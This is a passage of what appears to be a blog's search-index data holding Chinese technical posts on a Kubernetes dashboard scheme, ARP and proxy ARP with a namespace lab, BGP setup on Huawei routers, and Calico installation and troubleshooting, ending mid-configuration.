websocket可以持续几个小时那么久 跳转到网关时, 可以携带更多的信息, 比如携带某个pod的id, 网关就可以直接跳转到对应的pod, 用户打开webshell就很方便了 网关的实现我不做过多的说明了, 只有一点建议, secret_code在跳转到网关后, 马上进行校验. 由于dashboard的前端路由实现问题, secret_code最好在校验后加密放置到cookie中, 实现方面的问题其他可以发邮件与我讨论.\n总结 这篇博客主要介绍了一种允许普通用户使用dashboard的功能. 在实现策略上, 利用了kubernetes的权限限制, token隐藏的方案, 该方案目前我已经加入到了我负责的PaaS平台中, 稳定性方面可以满足工作需求, 安全性正如博客中介绍, 大家可以自行斟酌.\n","permalink":"https://www.oomkill.com/2021/01/pass-base-dashboard-k8s/","summary":"","title":"基于Kubernetes的PaaS平台提供dashboard支持的一种方案"},{"content":"什么是arp 地址解析协议，Address Resolution Protoco，使用ARP协议可实现通过IP地址获得对应主机的的物理地址（MAC）\n在TCP/IP的网络环境下，每个互联网的主机都会被分配一个32位的IP地址，这种互联网地址是在网际范围标识主机的一种逻辑地址。为了让报文在物理网路上传输，还补习要知道对方目的主机的物理地址才行。这样就存在把IP地址变换成物理地址的地址转换问题。\n在以太网环境，为了正确地向目的主机传送报文，必须把目的主机的32为IP地址转换成为目的主机48位以太网地址(MAC),这个就需要在互联层有一个服务或功能将IP地址转换为相应的物理地址(MAC)，这个服务就是ARP协议.\n所谓的\u0026quot;地址解析\u0026quot;，就是主机在发送帧之前将目标IP地址转换成目标MAC地址的过程。ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证主机间互相通信的顺利进行.\nARP协议和DNS有相像之处。不同点是：DNS实在域名和IP之间解析，另外ARP协议不需要配置服务，而DNS要配置服务才行。\nARP缓存表 在每台安装有TCP/IP协议的设备都会有一个ARP缓存表（windows命令提示符里输入arp -a即可）， 表里的IP地址与MAC地址是一一对应的。\nC:\\Users\\CM\u0026gt;arp -a\r接口: 192.168.1.103 --- 0x3\rInternet 地址 物理地址 类型\r192.168.1.1 3c-46-d8-5d-53-87 动态\r192.168.1.255 ff-ff-ff-ff-ff-ff 静态\r224.0.0.22 01-00-5e-00-00-16 静态\r224.0.0.251 01-00-5e-00-00-fb 静态\r224.0.0.252 01-00-5e-00-00-fc 静态\r239.11.20.1 01-00-5e-0b-14-01 静态\r239.255.255.250 01-00-5e-7f-ff-fa 静态\rarp常用命令 arp -a 查看所有记录\narp -d 清除arp表\narp -s $ip $mac 将绑定IP和MAC\narp -n 不解析名称打印arp表\nARP缓存是把双刃剑 主机有了arp缓存表，可以加快arp的解析速度，减少局域网内广播风暴。\n正是有了arp缓存表，给恶意黑客带来了攻击服务器主机的风险，这个就是arp欺骗攻击\n切换路由器，负载均衡器等设备时，可能会导致短时网络中断（发送广播）。\n为什么要使用ARP协议 OSI模型把网络工作分为七层，彼此不直接打交道，只通过接口(layer interface)。IP地址工作在第三层，MAC地址工作在第二层。在局域网中，当主机或其它三层网络设备有数据要发送给另一台主机或三层网络设备时，它需要知道对方的网络层地址（即IP地址）。但是仅有IP地址是不够的，因为IP报文必须封装成帧才能通过物理网络发送，因此发送方还需要知道接收方的物理地址（即MAC地址），但又不能跨第二、三层，所以需要用ARP协议服务，来帮助获取到目的节点的MAC地址。ARP可以实现将IP地址解析为MAC地址。主机或三层网络设备上会维护一张ARP表，用于存储IP地址和MAC地址的关系。一般ARP表项包括动态ARP表项和静态ARP表项。\n模拟一个环境抓包分析arp数据包的内容 [Huawei] 系统视图\r\u0026lt;Huawei\u0026gt; 用户视图，开机命令行进入的就是用户视图\rsystem-view 用户视图切换系统视图\rinterface g0/0/0 选择接口\rdisplay arp all 查看arp表\rarp-porxy enable 开启代理ARP功能\r\u0026lt;Huawei\u0026gt;dis this #\rreturn\r# 设置g0/0/0接口ip\r[Huawei-GigabitEthernet0/0/0]ip a 192.168.0.1 24\rJan 19 2021 17:56:33-08:00 Huawei %%01IFNET/4/LINK_STATE(l)[0]:The line protocol\rIP on the interface GigabitEthernet0/0/0 has entered the UP state. [Huawei-GigabitEthernet0/0/0]\r[Huawei-GigabitEthernet0/0/0]dis this\r[V200R003C00]\r#\rinterface GigabitEthernet0/0/0\rip address 192.168.0.1 255.255.255.0 #\rreturn\r# 设置g0/0/1 ip\r[Huawei-GigabitEthernet0/0/0]int g0/0/1\r[Huawei-GigabitEthernet0/0/1]ip a 192.168.1.1 24\rJan 19 2021 17:57:02-08:00 Huawei %%01IFNET/4/LINK_STATE(l)[1]:The line protocol\rIP on the interface GigabitEthernet0/0/1 has entered the UP state. 此时查看pc与路由器的arp表\n$ arp -a\rInternet Address Physical Address Type\r$ ping另外一台设备 192.168.2.2\n$ ping 192.168.1.2\rPing 192.168.1.2: 32 data bytes, Press Ctrl_C to break\rRequest timeout!\rFrom 192.168.1.2: bytes=32 seq=2 ttl=127 time=15 ms\rFrom 192.168.1.2: bytes=32 seq=3 ttl=127 time=16 ms\r--- 192.168.1.2 ping statistics ---\r3 packet(s) transmitted\r2 packet(s) received\r33.33% packet loss\rround-trip min/avg/max = 0/15/16 ms\r另外一段抓包可以看到对应收到的广播\n以太网arp数据包段说明\n目的mac地址 源mac地址 帧类型 硬件类型 上层协议类型 mac地址长度 ip地址长度 操作类型 源mac地址 源ip地址 目的mac地址 目的ip地址 HuaweiTe_c7:73:db (54:89:98:c7:73:db) HuaweiTe_58:37:e8 (00:e0:fc:58:37:e8) ARP Ethernet IPv4 6 4 2 HuaweiTe_58:37:e8 (00:e0:fc:58:37:e8) 192.168.0.1 HuaweiTe_c7:73:db (54:89:98:c7:73:db) 192.168.0.2 arp广播是通过网关进行传递的，本机arp表缓存的为网关的mac地址\n$ arp -a\rInternet Address Physical Address Type\r192.168.1.1 00-E0-FC-58-37-E9 dynamic\rop操作类型说明\n代码 说明 1 arp请求 2 arp应答 3 rarp请求 4 rarp应答 动态ARP表项 动态ARP表项由ARP协议通过ARP报文自动生成和维护，可以被老化，可以被新的ARP报文更新，也可以被静态ARP表项所覆盖。当到达老化时间或接口关闭时会删除相应的动态ARP表项。\n静态ARP表项 静态ARP表项通过手工配置（通过对应设备的IP地址与MAC地址绑定命定进行）和维护。不会被老化，也不会被动态ARP表项覆盖。配置静态ARP表项可以增加通信的安全性，因为静态ARP可以限定和指定IP地址的设备通信时只使用指定的MAC地址（也就是我们通常所说的IP地址和MAC地址的绑定），此时攻击报文无法修改此表项的IP地址和MAC地址的映射关系，从而保护了本设备和指定设备间正常通信。静态ARP表项又分为短静态ARP表项和长静态ARP表项\n短静态ARP表项 在配置短静态ARP表项时，只需要配置IP地址和MAC地址项。如果出接口是三层以太网接口，短静态ARP表项可以直接用于报文转发；如果出接口是VLAN虚接口，短静态ARP表项不能直接用于报文转发，当要发送IP数据包时，先发送ARP请求报文，如果收到的相应报文中的源IP地址和源MAC地址与所配置的IP地址和MAC地址相同，则将接受ARP响应报文的接口加入该静态表项中，之后就可以用于IP数据包的转发了。\n长静态ARP表项 在配置长静态ARP表项时，除了配置IP地址和MAC地址项外，还必须配置该ARP表所对应的VLAN（虚拟局域网）和出接口。也就是长静态ARP表项同事绑定了IP地址、MAC地址、VLAN和端口，可以直接用于报文转发。\napr欺骗 ARP病毒，ARP欺骗\n高可用服务器对之间切换时要考虑ARP缓存问题\n路由器等设备无缝迁移时要考虑ARP缓存的问题，例如：更换办公室的路由器.\nARP欺骗原理 ARP攻击就是通过伪造IP地址和MAC地址对实现ARP欺骗的，如果一台主机中了ARP病毒，那么它就能够在网络中产生大量的ARP通信量（它会以很快的频率进行广播），以至于使网络阻塞，攻击者只要持续不断的发出伪造ARP响应包就能更改局域网中目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。\nARP攻击主要是存在于局域网网络中，局域网中若有一个人感染ARP木马，则感染该ARP木马的系统将会试图通过“ARP欺骗”手段截获所在网络内其他计算机的通信故障。\n服务器切换ARP问题\n当网络中一台提供服务的机器宕机后，当在其他运行正常的机器添加宕机的机器的IP时，会因为客户端的ARP table cache的地址解析还是宕机的机器的MAC地址。从而导致，即使在其他运行正常的机器添加宕机的机器的IP，也会发生客户依然无法访问的情况。\n解决方法是：当宕机时，IP地址迁移到其他机器上时，需要通过arping命令来通知所有网络内机器清除其本地的ARP table cache，从而使得客户机访问时重新广播获取MAC地址.\n几乎所有的高可用软件都会考虑这个问题。\nARP广播而进行新的地址解析。\nlinux下具体命令：\narping -I eth0 -c 3 -s 10.0.0.162 10.0.0.253\rarping -U -I eth0 10.0.0.162\rproxy arp 代理ARP的原理就是当出现跨网段的ARP请求时，路由器将自己的MAC返回给发送ARP广播请求发送者，实现MAC地址代理（善意的欺骗），最终使得主机能够通信。\n如一个网络中设备D1 (192.168.0.2/24) 与设备D2 (192.168.1.2/24)，D1和D2在相互通信时，D1先发送了ARP广播，请求D2的mac地址，但是由于两个设备处于不同网，也就是说D1的ARP请求会被R1拦截到，然后R1会封装自己的mac地址为目的地址发送一个ARP回应数据报给R1（善意的欺骗），然后R1就会代替D1去访问D2。\n如上述arp抓包图，首先广播收到回复为R1192.168.0.1\n如果R1关闭了arp的代理功能，那么R1再访问R3的时候，R2并不会把自己的mac地址给R1，那么R1和R3之间就无法通信。默认情况下，思科的设备是开启了arp代理功能，也就是说，R2会作为中间代理实现R1和R3之间跨网段通信。\n实验：通过命名空间模拟容器网络的代理arp数据包 实验前所需掌握的知识接口作用域 interface scope与链路本地地址（Link-local address)\n接口作用域 路由的接口作用域，这个配置可以解释为路由的范围会影响源数据（源地址）请求的选择。当主机存在多个网络接口和地址时，route scope控制ip数据寻址和广播的范围。\nglobal：如果来自不同的端口（可以理解为网卡等）可以转发。\nlink：仅在此设备有效，即只有来自这个网络接口设备的流量才走这条路由（发送和接收为同一端口）\nhost：本地回环，仅用于在主机内部进行通信。\nsite：ipv6独有。\nreference http://linux-ip.net/html/tools-ip-address.html\n链路本地地址 169.254.0.0/16 保留地址块，在169.254.1.0 ~ 169.254.254.255 中随机选择一个地址进行ARP广播，如果收到回复，表示IP地址已经使用。\n在Kubernetes Calico网络中，当一个数据包的目的地址不是本网络时，会先发起ARP广播，网关设置即169.254.1.1收到会将自己的mac地址返回给发送端，后续的请求由这个veth对进行完成，使用代理arp做了arp欺骗。这样做抑制了arp广播攻击，并且通过代理arp也可以进行跨网络的访问。\n实验目的：模拟calico网络，使用代理arp欺骗完成网络的跨网段通信\n在准备的两个主机进行相应的设置\n# 添加网络名称空间\rip netns add net1\r# 创建一个虚拟以太网对\rip link add veth1 type veth peer name eth1\r# 将一端关联至网络名称空间内\rip link set eth1 netns net1\r# 设置一个IP地址\rip netns exec net1 ip addr add 192.168.1.10/24 dev eth1\r# 启动这个网卡\rip netns exec net1 ip link set eth1 up\r# 添加一个自动寻址IP，作为网关\rip netns exec net1 ip route add 169.254.1.1 dev eth1 scope link\r# 所有的流量都通过这个网关进行进出\rip netns exec net1 ip route add default via 169.254.1.1 dev eth1\rip netns exec net1 ip route ip netns exec net1 ip link set eth1 up\r# 设置主机端的网络对\rip link set veth1 up\r# 所有通过192.168.1.10的数据包进出都走veth1\rip route add 192.168.1.10 dev veth1 scope link\r# 通往192.168.2.10的数据的下一挑是10.0.0.3（对端主机IP）\rip route add 192.168.2.10 via 10.0.0.3 dev eth0\r## 设置另外一台设备\rip netns add net1\rip link add veth1 type veth peer name eth1\rip link set eth1 netns net1\rip netns exec net1 ip addr add 192.168.2.10/24 dev eth1\rip netns exec net1 ip link set eth1 up\rip netns exec net1 ip route add 169.254.1.1 dev eth1 scope link\rip netns exec net1 ip route add default via 169.254.1.1 dev eth1\rip netns exec net1 ip route ip link set veth1 up\rip route add 192.168.2.10 dev veth1 scope link\rip route add 192.168.1.10 via 10.0.0.4 dev eth0\r开启对应内核设置\n# 代理arp\recho 1 \u0026gt; /proc/sys/net/ipv4/conf/veth1/proxy_arp\r# 专用VLAN代理arp。基本上允许代理arp回复到同一接口\recho 1 \u0026gt; /proc/sys/net/ipv4/conf/veth1/proxy_arp_pvlan\r# 内核转发\recho 1 \u0026gt; /proc/sys/net/ipv4/ip_forward\rreference\nlinux proxy arp\n169.254-ip-address\n​\n","permalink":"https://www.oomkill.com/2021/01/arp-proxy-and-arp/","summary":"","title":"ARP与ARP Proxy"},{"content":"概述 BGP Border Gateway Protocol 边界网关协议,，是一种运行于TCP上的自治系统AS（Autonomous System）之间的路由可达，并选择最佳路由的距离矢量路由协议。\n早期发布的三个版本分别是BGP-1、BGP-2和BGP-3，1994年开始使用BGP-4，2006年之后单播IPv4网络使用的版本是BGP-4，其他网络（如IPv6等）使用的版本是MP-BGP。\nMP-BGP是对BGP-4进行了扩展，来达到在不同网络中应用的目的，BGP-4原有的消息机制和路由机制并没有改变。MP-BGP在IPv6单播网络上的应用称为BGP4+，在IPv4组播网络上的应用称为MBGP（Multicast BGP）。\n历史 为方便管理规模不断扩大的网络，网络被分成了不同的自治系统。1982年，外部网关协议EGP（Exterior Gateway Protocol）被用于实现在AS之间动态交换路由信息。但是EGP设计得比较简单，只发布网络可达的路由信息，而不对路由信息进行优选，同时也没有考虑环路避免等问题，很快就无法满足网络管理的要求。\nBGP是为取代最初的EGP而设计的另一种外部网关协议。不同于最初的EGP，BGP能够进行路由优选、避免路由环路、更高效率的传递路由和维护大量的路由信息。\n虽然BGP用在AS之间传递路由信息，但并非所有AS之间传递路由信息都要运行BGP。如数据中心上行到Internet的出口上，为了避免Internet海量路由对数据中心内部网络影响，设备采用静态路由代替BGP与外部网络通信。\n受益\nBGP从多方面保证了网络的安全性、灵活性、稳定性、可靠性和高效性：\nBGP采用认证和GTSM的方式，保证了网络的安全性。\nBGP提供了丰富的路由策略，能够灵活的进行路由选路，并且能指导邻居按策略发布路由。\nBGP提供了路由聚合和路由衰减功能用于防止路由振荡，有效提高了网络的稳定性。\nBGP使用TCP作为其传输层协议（端口号为179），并支持BGP与BFD联动、BGP Tracking和BGP GR和NSR，提高了网络的可靠性。\n在邻居数目多、路由量大且大多邻居有相同出口策略场景下，BGP用按组打包技术极大提高了BGP打包发包性能。\nBGP相关名词说明 名词 说明 BGP 边界网关协议（Border Gateway Protocol）是互联网上一个核心的去中心化自治路由协议，它通过维护IP路由表或前缀表来实现自治系统（AS）之间的可达性大多数ISP使用BGP来与其他ISP创建路由连接，特大型的私有IP网络也可以使用BGPBGP的通信对端（对等实体，Peer）通过TCP（端口179）会话交换数据，BGP路由器会周期地发送19字节的保活消息来维护连接。在路由协议中，只有BGP使用TCP作为传输层协议 IBGP 内部边界网关协议。同一个AS内部的两个或多个对等实体之间运行的BGP被称为IBGP IGP 内部网关协议。同一AS内部的对等实体（路由器）之间使用的协议，它存在可扩容性问题：1. 一个IGP内部应该仅有数十（最多小几百）个对等实体2. 对于端点数，也存在限制，一般在数百（最多上千）个Endpoint级别IBGP和IGP都是处理AS内部路由的，仍然需要IGP的原因是：1. IBGP之间是TCP连接，也就意味着IBGP邻居采用的是逻辑连接的方式，两个IBGP连接不一定存在实际的物理链路。所以需要有IGP来提供路由，以完成BGP路由的递归查找2. BGP协议本身实际上并不发现路由，BGP将路由发现的工作全部移交给了IGP协议，它本身着重于路由的控制 EBGP 外部边界网关协议。归属不同的AS的对等实体之间运行的BGP称为EBGP AS 自治系统（Autonomous system），一个组织（例如ISP）管辖下的所有IP网络和路由器的整体参与BGP路由的每个AS都被分配一个唯一的自治系统编号（ASN）。对BGP来说ASN是区别整个相互连接的网络中的各个网络的唯一标识。64512到65535之间的ASN编号保留给专用网络使用 RouteReflector 同一AS内如果有多个路由器参与BGP路由，则它们之间必须配置成全连通的网状结构——任意两个路由器之间都必须配置成对等实体。由于所需要TCP连接数是路由器数量的平方，这就导致了巨大的TCP连接数为了缓解这种问题，BGP支持两种方案：Route Reflector、Confederations路由反射器（Route Reflector）是AS内的一台路由器，其它所有路由器都和RR直接连接，作为RR的客户机。RR和客户机之间建立BGP连接，而客户机之间则不需要相互通信RR的工作步骤如下：1. 从非客户机IBGP对等实体学到的路由，发布给此RR的所有客户机2. 从客户机学到的路由，发布给此RR的所有非客户机和客户机3. 从EBGP对等实体学到的路由，发布给所有的非客户机和客户机RR的一个优势是配置方便，因为只需要在反射器上配置 工作负载 Workload，即运行在Calico节点上的虚机或容器 全互联 全互联网络（Full node-to-node Mesh）是指任何两个Calico节点都进行配对的L3连接模式 BGP 应用 国内IDC机房需要在 CNNIC (中国互联网信息中心)或 APNIC (亚太网络信息中心)申请自己的IP地址段和AS号，然后将自己的IP地址广播到其它网络运营商的AS中，并通过BGP协议将多个AS进行连接，从而实现可自动跨网访问。此时，当用户发出访问请求后，将根据BGP协议的机制自动在已建立连接的多个AS之间为用户提供最佳路由，从而实现不同网络运营商用户的高速访问同一机房资源。\nBGP的运行 BGP使用TCP为传输层协议，TCP端口号179。路由器之间的BGP会话基于TCP连接而建立。运行BGP的路由器被称为BGP发言者（BGP Speaker），或BGP路由器。两个建立BGP会话的路由器互为对等体（或称通信对端/对等实体，peer）。BGP对等体之间交换BGP路由表。\nBGP路由器只发送增量的BGP路由更新，或进行触发更新（不会周期性更新）。\nBGP具有丰富的路径属性和强大的路由策略工具。\nBGP能够承载大批量的路由前缀，用于大规模的网络中。\nIBGP And EBGP 同一个AS自治系统中的两个或多个对等实体之间运行的BGP被称为iBGP（Internal/Interior BGP）。归属不同的AS的对等实体之间运行的BGP称为eBGP（External/Exterior BGP）。在AS边界上与其他AS交换信息的路由器被称作边界路由器（border/edge router），边界路由器之间互为eBGP对端。\niBGP和eBGP的区别主要在于转发路由信息的行为。例如，从eBGP peer获得的路由信息会分发给所有iBGP peer和eBGP peer，但从iBGP peer获得的路由信息仅会分发给所有eBGP peer。所有的iBGP peer之间需要全互联。\n总结\nIBGP（Internal BGP）：位于相同自治系统的BGP路由器之间的BGP邻接关系。\n两台路由器之间要建立IBGP对等体关系，必须满足两个条件：\n两个路由器所属AS需相同（也即AS号相同）。\n在配置BGP时，Peer命令所指定的对等体IP地址要求路由可达，并且TCP连接能够正确建立\nEBGP（External BGP）：位于不同自治系统的BGP路由器之间的BGP邻接关系。\n两台路由器之间要建立EBGP对等体关系，必须满足两个条件：\n两个路由器所属AS不同（也即AS号不同）。\n在配置BGP时，Peer命令所指定的对等体IP地址要求路由可达，并且TCP连接能够正确建立.\n实验：配置BGP R1、R2及R3属于AS 123，R4属于AS 400；\nAS123内的R1、R2及R3运行OSPF，通告各自直连接口（包括三台设备的Loopback0接口），注 意OSPF域的工作范围；所有设备的Loopback0接口地址为 x.x.x.x/32，其中x为设备编号（如R1的接口地址为 1.1.1.1/32）。\nR3与R4之间建立EBGP对等体关系，R2暂时不运行BGP，R1与R3之间建立IBGP对等体关系， 所有的BGP对等体关系基于直连接口建立；R4将直连路由4.4.4.4/32通告到BGP，要求R1能学习到 BGP路由4.4.4.4/32；\n修改BGP配置，使得R1与R3基于Loopback0接口建立IBGP对等体关系\n[eNSP BGP实验](https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/basic bgp.zip)\n配置ospf\nospf router-id 1.1.1.1\rarea 0\r# 这里声明的路由为单独的，否则声明全部的会使用ospf学到对应的路由\rnetwork 10.0.0.0 255.255.255.0\r# 这里通过的L0接口进行bgp链接的，所以需要声明该路由。否则ospf学习不到无法链接\rnetwork 1.1.1.1 255.255.255.255\r[R1-ospf-1-area-0.0.0.0]dis this\r[V200R003C00]\r#\rarea 0.0.0.0 network 0.0.0.0 255.255.255.255 配置bgp\nbgp 123\r# 设置route-id\rrouter-id 1.1.1.1\r# 自治系统号码为123\rpeer 3.3.3.3 as-number 123\r# 建立链接的接口使用的L0，如不指定，默认使用出接口做连接。\rpeer 3.3.3.3 connect-interface LoopBack0\r# 设置另外一个路由器\rbgp 123\rrouter-id 3.3.3.3\rpeer 1.1.1.1 as-number 123 peer 1.1.1.1 connect-interface LoopBack0\r# 声明一个bgp路由\rnetwork 33.33.33.33 255.255.255.255\r此时可以看到对应的路由已经学习到了\n[R1]dis bgp routing-table BGP Local router ID is 1.1.1.1 Status codes: * - valid, \u0026gt; - best, d - damped,\rh - history, i - internal, s - suppressed, S - Stale\rOrigin : i - IGP, e - EGP, ? - incomplete\rTotal Number of Routes: 2\rNetwork NextHop MED LocPrf PrefVal Path/Ogn\ri 4.4.4.4/32 10.2.0.2 0 100 0 400i\r*\u0026gt;i 33.33.33.33/32 3.3.3.3 0 100 0 i\r配置一个ebgp\n# 这是两个路由器间的bgp配置。因为L0没有对应的互通接口所以使用默认出接口进行链接。\rpeer 10.2.0.1 as-number 123 # 与123 as里的bgp形成一个对等实体\rpeer 10.2.0.2 as-number 400 # 与400 as里的bgp形成一个对等实体\r# 在R4上声明一个路由\rnetwork 4.4.4.4 255.255.255.255\rdis bgp ip routing-table\t# 在R3上，可以看到通过eBGP学习到的到4.4.4.4的路由\r[R3-bgp]dis ip routing-table 4.4.4.4/32 EBGP 255 0 D 10.2.0.2 GigabitEthernet0/0/1\rrefresh bgp external import 刷新BGP\nBGP的RR 由于IBGP水平分割的存在，为了保证所有的BGP路由器都能学习到完整的BGP路由，就必须在AS内实现IBGP全互联，这就导致AS内部需要维护大量的BGP连接，从而影响网络性能，路由反射器（Route Reflector，RR）可以“放宽”水平分割原则，解决该问题。\n为保证IBGP对等体之间的连通性，需要在IBGP对等体之间建立全连接关系。假设在一个AS内部有n台设备，那么建立的IBGP连接数就为n(n-1)/2。当设备数目很多时，设备配置将十分复杂，而且配置后网络资源和CPU资源的消耗都很大。在IBGP对等体间使用路由反射器可以解决以上问题。\nBGP反射规则\nBGP RR在接收到BGP路由时\n如果该路由学习自非Client IBGP对等体，则反射给自己所有的Client；\n如果路由学习自Client，则反射给所有非Client IBGP对等体和除了该Client之外的所有Client（华为设备可通过命令关闭RR在Client之间的路由反射行为）；\n如果路由学习自EBGP对等体，则发送给所有Client和非Client IBGP对等体。\nBGP RR的配置\n[BGP RouteReflector.zip](https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/BGP RouteReflector.zip)\n# 进入系统视图\rsystem-view # 设置路由器的名称\rsysname R2\r# 进入g0/0/0接口\rin g0/0/0\rip address 10.0.0.2 24\r# 配置l0口\rin l0\rip address 2.2.2.2 32\r# 只有R1需要配置次步骤\rin g0/0/1\rip address 10.1.0.1 24\r# 查看接口的信息\rdis ip in b\t配置ospf\nospf router-id 1.1.1.1\rarea 0\rnetwork 1.1.1.1 0.0.0.0\rnetwork 10.0.0.0 0.0.0.255\rnetwork 10.1.0.0 0.0.0.255\rbgp 123\rrouter-id 1.1.1.1\rpeer 2.2.2.2 as-number 123 peer 2.2.2.2 connect-interface LoopBack0\rpeer 3.3.3.3 as-number 123 peer 3.3.3.3 connect-interface LoopBack0\r#\ripv4-family unicast\rundo synchronization\rpeer 2.2.2.2 enable\rpeer 2.2.2.2 reflect-client\rpeer 3.3.3.3 enable\rpeer 3.3.3.3 reflect-client\r配置路由反射器反射客户端\n# 此处是1.1.1.1的配置\r# 以1.1.1.1 为中心 指定2.2.2.2为反射客户端 peer 2.2.2.2 reflect-client\rpeer 3.3.3.3 reflect-client\r","permalink":"https://www.oomkill.com/2021/01/dynamic-routing-bgp/","summary":"","title":"动态路由- BGP"},{"content":"Calico针对容器、虚拟机的开源网络和网络安全解决方案。是纯三层的数据中心网络方案。\nCalico在每一个计算节点利用Linux Kernel实现了一个高效的虚拟路由器vRouter来负责数据转发，而每个vRouter通过BGP协议负责把自己上运行的workload的路由信息向整个Calico网络内传播。（小规模部署可以直接互联 BGP full mesh，大规模下可通过指定的BGP route reflector来完成）。 这样保证最终所有的workload之间的数据流量都是通过IP路由的方式完成互联的。Calico节点组网可以直接利用数据中心的网络结构（无论是L2或者L3），不需要额外的NAT，隧道或者Overlay Network。\nCalico还基于iptables还提供了丰富而灵活的网络Policy，保证通过各个节点上的ACLs来提供Workload的多租户隔离、安全组以及其他可达性限制等功能。\ncalico组件 在Kubernetes平台之上calico/node容器会通过DaemonSet部署到每个节点，并运行三个守护程序：\nFelix：用于管理路由规则，负责状态上报。 BIRD：BGP的客户端，用于将Felix的路由信息加载到内核中，同时负责路由信息在集群中的分发。 confd：用于监视Calico存储（etcd）中的配置变更并更新BIRD的配置文件。 calicoctl使用问题\nFailed to create Calico API client: invalid configuration: no configuration has been provided\r默认情况下，calicoctl 将使用位于的默认KUBECONFIG从 Kubernetes APIServer 读取$(HOME)/.kube/config 。\n如果默认的 KUBECONFIG 不存在，或者想从指定的存储访问信息，则需要单独配置。\nexport DATASTORE_TYPE=kubernetes\rexport DATASTORE_TYPE=etcdv3\rexport KUBECONFIG=~/.kube/config\rreference for\ncalico 安装配置 开始前准备\n确定calico数据存储\nCalico同时支持kubernetes api和etcd数据存储。官方给出的建议是在本地部署中使用K8S API，仅支持Kubernetes模式。而官方给出的etcd则是混合部署（Calico作为Kubernetes和OpenStack的网络插件运行）的最佳数据存储。\n使用kubernetes api作为数据存储的安装\ncurl https://docs.projectcalico.org/manifests/calico.yaml -O\rkubectl apply -f calico.yaml\r修改Pod CIDR\nCalico默认的Pod CIDR使用的是192.168.0.0/16，这里一般使用与controller-manager中的--cluster-cidr 保持一,取消资源清单内的 CALICO_IPV4POOL_CIDR变量的注释，并将其设置为与所选Pod CIDR相同的值。\ncalico的IP分配范围\nCalico IPAM从ipPool分配IP地址。修改Pod的默认IP范围则修改清单calico.yaml中的 CALICO_IPV4POOL_CIDR\n配置Calico的 IP in IP\n默认情况下，Calico中的IPIP已经禁用，这里使用的v3.17.2 低版本默认会使用IPIP\n要开启IPIP mode则需要修改配置清单内的 CALICO_IPV4POOL_IPIP 环境变量改为 always\n修改secret\n# Populate the following with etcd TLS configuration if desired, but leave blank if\r# not using TLS for etcd.\r# The keys below should be uncommented and the values populated with the base64\r# encoded contents of each file that would be associated with the TLS data.\r# Example command for encoding a file contents: cat \u0026lt;file\u0026gt; | base64 -w 0\r# etcd的ca\retcd-ca: # 填写上面命令编码后的值\r# etcd客户端key\retcd-key: # 填写上面命令编码后的值\r# etcd客户端访问证书\retcd-cert: # 填写上面命令编码后的值\r修改configMap\netcd_endpoints: \u0026quot;https://10.0.0.6:2379\u0026quot;\r# If you're using TLS enabled etcd uncomment the following.\r# You must also populate the Secret below with these files.\retcd_ca: \u0026quot;/calico-secrets/etcd-ca\u0026quot;\retcd_cert: \u0026quot;/calico-secrets/etcd-cert\u0026quot;\retcd_key: \u0026quot;/calico-secrets/etcd-key\u0026quot;\r在卷装载中设置440将解决此问题\n/calico-secrets/etcd-cert: permission denied\n2021-02-08 02:15:10.485 [INFO][1] main.go 88: Loaded configuration from environment config=\u0026amp;config.Config{LogLevel:\u0026quot;info\u0026quot;, WorkloadEndpointWorkers:1, ProfileWorkers:1, PolicyWorkers:1, NodeWorkers:1, Kubeconfig:\u0026quot;\u0026quot;, DatastoreType:\u0026quot;etcdv3\u0026quot;}\r2021-02-08 02:15:10.485 [FATAL][1] main.go 101: Failed to start error=failed to build Calico client: could not initialize etcdv3 client: open /calico-secrets/etcd-cert: permission denied\r找到资源清单内的对应容器（calico-kube-controllers）的配置。\nvolumes:\r# Mount in the etcd TLS secrets with mode 400.\r# See https://kubernetes.io/docs/concepts/configuration/secret/\r- name: etcd-certs\rsecret:\rsecretName: calico-etcd-secrets\rdefaultMode: 0400 # 改为0440\r使用单独的etcd作为calico数据存储还需要修改calicoctl数据存储访问配置\ncalicoctl 在默认情况下，查找配置文件的路径为/etc/calico/calicoctl.cfg上。可以使用--config覆盖此选项默认配置。\n如果calicoctl无法获得配置文件，将检查环境变量。\napiVersion: projectcalico.org/v3\rkind: CalicoAPIConfig\rmetadata:\rspec:\rdatastoreType: etcdv3\retcdEndpoints: \u0026quot;https://10.0.0.6:2379\u0026quot;\retcdCACert: |\r# 这里填写etcd ca证书文件的内容，无需转码base64\retcdCert: |\r# 这里填写etcd client证书文件的内容，无需转码base64\retcdKey: |\r# 这里填写etcd client秘钥文件的内容，无需转码base64\rreference：\nSecret permission denied\nconfiguration calicoctl\neb 7 21:25:13 master01 etcd: recognized environment variable ETCD_NAME, but unused: shadowed by corresponding flag\rFeb 7 21:25:13 master01 etcd: unrecognized environment variable ETCD_SERVER_NAME=hk.etcd\rFeb 7 21:25:13 master01 etcd: recognized environment variable ETCD_DATA_DIR, but unused: shadowed by corresponding flag\rFeb 7 21:25:13 master01 etcd: recognized environment variable ETCD_LISTEN_CLIENT_URLS, but unused: shadowed by corresponding flag\rFeb 7 21:25:13 master01 etcd: etcd Version: 3.3.11\rFeb 7 21:25:13 master01 etcd: Git SHA: 2cf9e51\rFeb 7 21:25:13 master01 etcd: Go Version: go1.10.3\rFeb 7 21:25:13 master01 etcd: Go OS/Arch: linux/amd64\rFeb 7 21:25:13 master01 etcd: setting maximum number of CPUs to 2, total number of available CPUs is 2\rFeb 7 21:25:13 master01 etcd: the server is already initialized as member before, starting as etcd member...\rFeb 7 21:25:13 master01 etcd: peerTLS: cert = /etc/etcd/pki/peer.crt, key = /etc/etcd/pki/peer.key, ca = , trusted-ca = /etc/etcd/pki/ca.crt,\rclient-cert-auth = true, crl-file =\rFeb 7 21:25:13 master01 etcd: listening for peers on https://10.0.0.5:2380\rFeb 7 21:25:13 master01 etcd: listening for client requests on 10.0.0.5:2379\rFeb 7 21:25:13 master01 etcd: panic: freepages: failed to get all reachable pages (page 3471766746605708656: out of bounds: 1633)\r集群节点损坏\npanic: freepages: failed to get all reachable pages (page 3471766746605708656: out of bounds: 1633)\r这是k8s不支持当前calico版本的原因, calico版本与k8s版本支持关系可到calico官网查看:\nerror: unable to recognize \u0026quot;calico.yaml\u0026quot;: no matches for kind \u0026quot;PodDisruptionBudget\u0026quot; in version \u0026quot;policy/v1\u0026quot;\r配置SW\nsystem-view\rsysname SW1\rvlan batch 10 20 30\rinterface GigabitEthernet0/0/1\rport link-type 